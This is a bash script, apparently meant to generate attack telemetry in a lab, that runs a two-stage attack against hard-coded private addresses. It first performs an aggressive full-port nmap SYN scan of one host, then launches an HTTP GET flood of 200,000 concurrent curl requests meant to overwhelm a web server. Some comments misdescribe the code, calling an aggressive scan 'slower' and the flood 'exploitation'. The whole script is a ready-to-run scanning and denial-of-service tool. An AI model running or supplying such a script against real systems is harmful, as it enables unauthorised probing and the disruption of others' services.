#!/bin/bash
# Description: Executes a multi-stage attack hitting both Layer 4 and Layer 7.

SSH_TARGET="10.10.10.10"
WEB_TARGET="10.10.10.20"

echo "[*] Initiating structured cyberattack simulation..."

# STAGE 1: Reconnaissance (Layer 4 SYN Scan). Slower scans to not hit practical threshold limits
echo "[*] Phase 1: Aggressive Nmap SYN Scan against $SSH_TARGET..."
nmap -sS -p- -T4 --min-rate 250 $SSH_TARGET

echo "[*] Phase 1 Complete. Pausing for 5 seconds to separate telemetry..."
sleep 5

# STAGE 2: Exploitation / Enumeration (Layer 7 Web Flood)

echo "[*] Phase 2: High-speed HTTP GET Flood against $WEB_TARGET..."
# This loop fires 200000 background curl requests to overwhelm the web server

for batch in {1..200}; do
  for req in {1..1000}; do
    curl -s -m 2 "http://$WEB_TARGET/admin_panel_bruteforce_${batch}_${req}" > /dev/null &
  done
  wait 
  sleep 0.5 # batch based rate limits
done

echo "[*] Phase 2 Complete. Multi-stage attack simulation finished."